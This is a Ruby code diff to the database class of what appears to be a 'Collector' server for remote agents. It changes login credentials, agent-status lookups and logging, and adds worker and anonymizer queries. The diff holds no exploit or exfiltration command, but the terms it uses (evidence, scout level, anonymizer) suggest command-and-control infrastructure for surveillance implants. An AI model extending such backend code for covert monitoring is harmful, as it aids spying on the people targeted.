@@ -29,7 +29,9 @@ class DB
   QUEUED_AGENT = 3
   NO_SUCH_AGENT = 4
   UNKNOWN_AGENT = 5
-  
+
+  AGENT_STATUSES = {active: 0, delete: 1, closed: 2, queued: 3, noagent: 4, unknown: 5}
+
   attr_reader :agent_signature
   attr_reader :network_signature
   attr_reader :check_signature
@@ -37,12 +39,6 @@ class DB
   def initialize
     # database address
     @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
-
-    # get the external ip address
-    $external_address = MyIp.get
-
-    # the version of the collector
-    version = File.read(Dir.pwd + '/config/VERSION_BUILD')
 
     # the username is an unique identifier for each machine.
     # we use the MD5 of the MAC address
@@ -53,9 +49,12 @@ class DB
       unique_id = Socket.gethostname
     end
 
-    @username = Digest::MD5.hexdigest(unique_id) + ':' + version + ':' + $external_address
+    @username = Digest::MD5.hexdigest(unique_id)
     # the password is a signature taken from a file
     @password = File.read(Config.instance.file('DB_SIGN'))
+
+    # the version of the collector
+    @build = File.read(Dir.pwd + '/config/VERSION_BUILD')
 
     # status of the db connection
     @available = false
@@ -75,10 +74,13 @@ class DB
     return @available
   end
 
-  def connect!
+  def connect!(type)
     trace :info, "Checking the DB connection [#{@host}]..."
-    
-    if @db_rest.login(@username, @password)
+
+    # special case for the collector
+    @username += ':' + ($external_address || '') if type.eql? :collector and not @username[':']
+
+    if @db_rest.login(@username, @password, @build, type)
       @available = true
       trace :info, "Connected to [#{@host}]"
     else
@@ -225,21 +227,23 @@ class DB
   end
 
   # returns ALWAYS the status of an agent
-  def agent_status(build_id, instance_id, platform, demo, scout)
+  def agent_status(build_id, instance_id, platform, demo, level)
     # if the database has gone, reply with a fake response in order for the sync to continue
     return agent_cached_status(build_id) unless @available
 
     trace :debug, "Asking the status of [#{build_id}_#{instance_id}] to the db"
 
     # ask the database the status of the agent
-    agent = db_rest_call :agent_status, build_id, instance_id, platform, demo, scout
+    agent = db_rest_call :agent_status, build_id, instance_id, platform, demo, level
 
-    trace :info, "Status of [#{build_id}_#{instance_id}] is #{agent[:status]} (#{agent[:good] ? 'good' : 'bad'})"
+    trace :info, "Status of [#{build_id}_#{instance_id}] is: #{AGENT_STATUSES.key(agent[:status])}, #{level}, #{agent[:good] ? 'good' : 'bad'}"
 
     return [agent[:status], agent[:id], agent[:good]]
   rescue Exception => e
     trace :info, "Cannot determine status of [#{build_id}_#{instance_id}], getting status from cache"
-    return agent_cached_status(build_id)
+    cached = agent_cached_status(build_id)
+    trace :info, "Cached status is: #{AGENT_STATUSES.key(cached[0])}, #{level}, #{cached[2] ? 'good' : 'bad'}"
+    return cached
   end
 
   def agent_cached_status(build_id)
@@ -295,6 +299,15 @@ class DB
     return unless @available
 
     db_rest_call :send_evidence, instance, evidence
+  end
+
+  def get_worker(instance)
+    return unless @available
+
+    # replace the _ to : in the instance before askig to db (which wants it in that format)
+    mod_instance = instance.dup
+    mod_instance[14] = ':'
+    db_rest_call :get_worker, mod_instance
   end
 
   def new_conf?(bid)
@@ -596,6 +609,10 @@ class DB
     db_rest_call :get_network_cert, file
   end
 
+  def first_anonymizer
+    return unless @available
+    db_rest_call :first_anonymizer
+  end
 end #DB
 
 end #Collector::
